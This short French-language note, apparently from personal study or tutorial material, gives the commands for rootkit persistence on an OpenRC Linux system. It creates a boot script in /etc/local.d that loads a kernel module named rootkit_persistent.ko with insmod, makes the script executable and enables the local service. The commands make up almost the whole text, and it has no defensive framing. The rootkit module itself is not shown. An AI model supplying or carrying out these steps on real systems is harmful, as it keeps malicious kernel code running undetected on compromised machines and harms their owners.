persistance:

Ajouter un fichier dans etc/local.d pour éxécuter des commandes au démarage
```
vi /etc/local.d/rootkit.start
```
rootkit.start ->:
```
#!/bin/sh
insmod /opt/mymodules/rootkit_persistent.ko
```

On donne les droits d'exec et on fait en sorte que les fichiers dans local soit éxécutés au démarage
```
chmod +x /etc/local.d/rootkit.start
rc-update add local default
```
